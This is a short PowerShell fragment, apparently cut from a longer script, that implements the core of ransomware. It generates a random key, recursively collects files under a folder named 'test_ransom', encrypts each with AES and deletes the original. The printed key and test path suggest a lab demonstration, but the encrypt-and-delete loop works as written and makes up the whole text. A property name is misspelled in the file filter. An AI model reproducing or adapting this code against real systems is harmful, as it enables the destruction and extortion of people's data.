...
$randomkey = -join ( (43..89) + (15..40) + (43..111) | Get-Random -Count 34 | % {[char]$_})
Write-Host "key: $randomkey"
$path = "C:\Users\FIXME\Documents\test_ransom"
$files = get-childitem -path $path -Recurse -force | where-object{!($_.PSIsContainter)} | % {$_.FullName} -ErrorAction SilentlyContinue
Write-Host "crypting files in $path"
foreach ($i in $files)
{
   Write-Host "$i"
   Invoke-AESEncryption -Mode Encrypt -Key $randomkey -Path $i ; Remove-Item $i -ErrorAction SilentlyContinue
}
